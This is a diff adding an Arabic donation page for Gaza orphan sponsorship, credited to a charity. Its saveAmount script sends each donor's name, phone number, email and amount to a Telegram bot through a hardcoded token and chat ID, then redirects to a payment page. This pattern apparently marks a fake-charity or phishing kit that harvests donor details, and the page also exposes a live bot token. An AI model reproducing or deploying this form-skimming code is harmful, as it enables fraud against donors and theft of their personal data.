@@ -1,0 +1,395 @@
+
+
+
+
+
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>صفحة التبرع</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
+
+  <style>
+    /* تنسيق الرأس */
+    header {
+      background-color: white;
+      padding: 20px 0;
+      text-align: center;
+      font-size: 25px;
+      font-weight: bold;
+    }
+    
+  
+    /* تنسيق الجسم */
+    body {
+      background-color: #f4f4f4;
+      font-family: 'Tajawal', sans-serif;
+      margin: 0;
+      padding: 0;
+    }
+  
+    /* تنسيق البوكس الكبير */
+    .main-box {
+      background-color: white;
+      margin: 30px auto;
+      padding: 20px;
+      width: 95%;
+      max-width: 1200px;
+      border-radius: 10px;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+    }
+  
+    /* تنسيق الصور داخل البوكس */
+    .main-box img {
+      width: 100%;
+      border-radius: 8px;
+    }
+  
+    /* تنسيق العنوان والنص */
+    .main-box h2 {
+      text-align: center;
+      font-size: 28px;
+      margin-top: 20px;
+      text-align: right;
+    }
+  
+    .main-box p {
+      text-align: center;
+      font-size: 16px;
+      color: #666;
+      margin-top: 10px;
+    }
+  
+    /* تنسيق البوكس الداخلي */
+    .inner-box {
+      display: flex;
+      justify-content: space-between;
+      margin-top: 20px;
+    }
+  
+    .inner-box p {
+      margin: 0;
+      font-size: 18px;
+    }
+  
+    /* تنسيق الخط */
+    .line {
+      width: 100%;
+      height: 1px;
+      background-color: #ccc;
+      margin-top: 10px;
+    }
+  
+    /* تنسيق الحقول */
+    .form-group {
+      margin-top: 20px;
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+    }
+  
+    .form-group input {
+      padding: 10px;
+      font-size: 16px;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      width: 99%;
+      align-items: center;
+    }
+  
+    .form-group button {
+      padding: 10px;
+      background-color: #007bff;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      font-size: 18px;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+  
+    .form-group button:hover {
+      background-color: #0056b3;
+    }
+  
+    /* تنسيق حقل الأرقام مع الأزرار */
+    .container {
+      text-align: center;
+      width: 100%;
+      max-width: 500px;
+    }
+  
+    .input-container {
+      display: flex;
+      align-items: center;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      width: 100%;
+      background-color: white;
+      padding: 5px;
+      margin-bottom: 20px;
+    }
+  
+    input[type="number"] {
+      width: 100%;
+      padding: 10px;
+      text-align: center;
+      font-size: 18px;
+      border: none;
+      outline: none;
+    }
+  
+    .btn {
+      background-color: #f8f9fa;
+      color: #6c757d;
+      border: 1px solid #ddd;
+      padding: 10px 15px;
+      font-size: 18px;
+      cursor: pointer;
+      border-radius: 0;
+    }
+  
+    .btn:hover {
+      background-color: #e2e6ea;
+      border-color: #ccc;
+    }
+  
+    input[type="number"]:focus {
+      border-color: #007BFF;
+    }
+  
+    .predefined-buttons {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 10px;
+    }
+  
+    .predefined-buttons .btn-pre-amount {
+      font-size: 14px;
+      padding: 8px 12px;
+    }
+  
+    .custom-donate-btn {
+      background-color: #006a8f;
+      color: #ffffff;
+      font-size: 16px;
+      text-align: center;
+      border: none;
+      border-radius: 6px;
+      padding: 10px 20px;
+      cursor: pointer;
+      width: 70%;
+      display: inline-block;
+      margin-top: 20px;
+    }
+  
+    .custom-donate-btn:hover {
+      background-color: #006a8f;
+    }
+  
+    input {
+      text-align: right; /* محاذاة النص إلى اليمين */
+      direction: rtl; /* لضبط اتجاه الكتابة من اليمين لليسار */
+      font-size: 16px;
+      padding: 10px;
+      width: 350px; /* يمكنك تعديل الحجم كما تريد */
+      margin: 20px;
+      align-items: center;
+  
+      justify-content: center;  /* توسيط العنصر أفقيًا */
+      margin: 0;                /* إزالة الهوامش */
+  
+    }
+  
+    #in1 ,#in2 ,#in3 {
+  margin-bottom: 20px; /* تباعد أكبر بين الحقل الأول والآخرين */
+  }
+  
+  #in3 {
+    margin-bottom: 20px;
+  }
+  #img11 { 
+    margin-left: 200px;
+  width: 150px;
+  height: auto;
+  }
+  #botin { 
+    width: 95%;
+  }
+  
+  footer {
+      width: 100%;
+      height: 100px;
+      background-color: #3d6a82; /* لون غامق للفوتر */
+    }
+  
+    #foter{ 
+  size: 16px;
+  font-size: 16px;
+  color: #ffd28e;
+  text-align: center;
+  padding-top: 25px;
+  }
+  #imgg{ 
+    margin-top: 10px;
+    width: 100%;
+  }
+  </style>
+</head>
+<body>
+
+  <!-- رأس الصفحة -->
+  <header>
+    <img id="img11" src="logo.png">
+  </header>
+
+  <!-- البوكس الكبير -->
+  <div class="main-box">
+    <img src="imgbox.jpeg" alt="صورة 1">
+    <img src="img2.png" alt="صورة 2">
+
+    <h2>كفالة الأيتام في غزة</h2>
+    <p>
+      قال رسول الله -صلى الله عليه وسلم-: (أنا وكافل اليتيم في الجنة هكذا؛ وأشار بالسبابة والوسطى وفرج بينهما).
+      قيمة الكفالة: 20 شهريا، المرحلة الأولى :- كفالة 25 يتيم.
+    </p>
+
+    <div class="inner-box">
+      <p>6,000 د.ك</p>
+      <p>قيمة المشروع</p>
+    </div>
+
+    <div class="line"></div>
+
+    <div class="inner-box">
+      <p>2,009 د.ك</p>
+      <p>المدفوع</p>
+    </div>
+
+    <div class="line"></div>
+
+    <div class="inner-box">
+      <p>3,991 د.ك</p>
+      <p>المتبقى</p>
+    </div>
+
+    <div class="line"></div>
+
+    <!-- نسبة التقدم -->
+    <div class="form-row align-items-center" style="direction: rtl;">
+      <div class="col">
+        <div class="progressbar" style="width: 100%; background-color: #eee; border-radius: 8px;">
+          <div class="proggress" style="background-color: #b07d1d; height: 14px; border-radius: 8px; width: 9%;"></div>
+        </div>
+      </div>
+      <div class="col-auto">
+        <div class="progressbar-donation-percent">
+          9%
+        </div>
+      </div>
+    </div>
+
+    <!-- بيانات المتبرع -->
+    <div class="form-group">
+      <input type="text" id="in1" placeholder="اسم المتبرع">
+      <input type="tel" id="in2" placeholder="رقم الهاتف">
+      <input type="email" id="in3" placeholder="البريد الإلكتروني">
+    </div>
+
+    <!-- اختيار المبلغ -->
+    <div class="container">
+      <div class="input-container">
+        <span>
+          <button class="btn" type="button" onclick="changeValue(-10)">-</button>
+        </span>
+        <input type="number" id="numberInput" value="0">
+        <span>
+          <button class="btn" type="button" onclick="changeValue(10)">+</button>
+        </span>
+      </div>
+
+      <!-- أزرار مبالغ جاهزة -->
+      <div class="predefined-buttons">
+        <a onclick="setPredefinedAmount(this, 1)" class="btn btn-lg btn-pre-amount">1</a>
+        <a onclick="setPredefinedAmount(this, 10)" class="btn btn-lg btn-pre-amount">10</a>
+        <a onclick="setPredefinedAmount(this, 50)" class="btn btn-lg btn-pre-amount">50</a>
+        <a onclick="setPredefinedAmount(this, 100)" class="btn btn-lg btn-pre-amount">100</a>
+        <a onclick="setPredefinedAmount(this, 300)" class="btn btn-lg btn-pre-amount">300</a>
+        <a onclick="setPredefinedAmount(this, 500)" class="btn btn-lg btn-pre-amount">500</a>
+        <a onclick="setPredefinedAmount(this, 1000)" class="btn btn-lg btn-pre-amount">1000</a>
+      </div>
+
+      <!-- زر تبرع -->
+      <a onclick="saveAmount()" class="btn custom-donate-btn" id="botin">تبرع</a>
+    </div>
+  </div>
+
+  <!-- الفوتر -->
+  <div>
+    <img src="foter.png" id="imgg" alt="img">
+  </div>
+  <footer>
+    <p id="foter">حقوق الطبع والنسخ محفوظة لجمعية الخير الإنسانية</p>
+  </footer>
+
+  <!-- السكربت -->
+  <script>
+    function saveAmount() {
+      var username = document.getElementById("in1").value.trim();
+      var phone = document.getElementById("in2").value.trim();
+      var email = document.getElementById("in3").value.trim();
+      var amount = document.getElementById("numberInput").value.trim();
+
+      if (username === "" || phone === "" || email === "" || amount === "") {
+        alert("يرجى تعبئة جميع الحقول");
+        return;
+      }
+
+      var token = "8033225099:AAHgj8hiipayInM_LtKxXk_2GrUcPsWL-Pk"; // التوكن الخاص بك
+      var chatId = "7347831054"; // معرف الشات
+
+      var message = `📩 بيانات تبرع جديدة:\n\n` +
+                    `👤 الاسم: ${username}\n` +
+                    `📞 الهاتف: ${phone}\n` +
+                    `📧 البريد الإلكتروني: ${email}\n` +
+                    `💰 المبلغ: ${amount} د.ك`;
+
+      var url = `https://api.telegram.org/bot${token}/sendMessage`;
+
+      fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: chatId, text: message })
+      })
+      .then(response => response.json())
+      .then(data => {
+        if (data.ok) {
+          window.location.href = "pay.html";
+        } else {
+          alert("فشل في إرسال البيانات. حاول لاحقاً.");
+          console.error("Telegram Error:", data);
+        }
+      })
+      .catch(error => {
+        console.error("Fetch Error:", error);
+        alert("حدث خطأ أثناء الإرسال.");
+      });
+    }
+
+    function changeValue(amount) {
+      var input = document.getElementById("numberInput");
+      var currentValue = parseInt(input.value) || 0;
+      var newValue = currentValue + amount;
+      input.value = newValue < 0 ? 0 : newValue;
+    }
+
+    function setPredefinedAmount(element, amount) {
+      document.getElementById("numberInput").value = amount;
+    }
+  </script>
+
+</body>
+</html>
